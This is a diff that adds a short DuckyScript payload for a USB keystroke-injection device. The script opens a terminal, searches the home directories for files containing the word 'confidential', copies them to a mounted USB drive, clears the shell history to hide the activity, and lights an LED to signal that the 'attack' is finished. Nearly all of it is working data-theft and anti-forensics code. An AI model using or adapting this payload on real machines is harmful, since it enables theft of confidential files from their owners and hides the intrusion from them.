@@ -1,0 +1,15 @@
+REM This script exfiltrates all files containing the string "confidential" from the computer to a connected USB drive
+CTRL ALT t
+DELAY 1000
+STRING cp `grep -lir "confidential" /home/` /media/uwe/OPE
+ENTER
+DELAY 30000
+STRING history -c
+DELAY 50
+ENTER
+DELAY 200
+STRING exit
+DELAY 100
+ENTER
+REM-- Turn on LED in Green to indicate completion of attack, the ducky can be removed
+LED_G 
